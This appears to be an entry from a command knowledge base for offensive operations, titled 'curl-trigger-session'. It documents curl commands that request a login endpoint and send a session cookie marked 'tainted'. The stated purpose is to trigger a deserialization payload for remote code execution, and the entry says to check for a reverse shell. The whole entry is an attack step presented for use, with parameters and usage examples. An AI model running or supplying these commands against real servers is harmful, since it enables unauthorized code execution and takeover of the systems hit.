---
data: 'curl http://target:8080/app/login?session=tainted -v'
tags:
  - rce
  - trigger
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.436Z'
id: 32c9f3c8-eb9b-4443-9739-044485bd2c55
verified: false
validated: true
submitted: true
---
# curl-trigger-session

## Command

```bash
curl http://target:8080/app/login?session=tainted -v
```

## Description

Triggers session loading to activate the deserialization payload for RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target:8080/app/login?session=tainted` | Endpoint that loads session | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl http://target:8080/app/login?session=tainted -v
```

### Advanced Usage

```bash
curl -c cookies.txt http://target:8080/app/dashboard --header "Cookie: JSESSIONID=tainted"
```

## Expected Output

Response may show errors or normal page; check server logs or reverse shell for RCE.

## Related

- [[Related Procedure]]
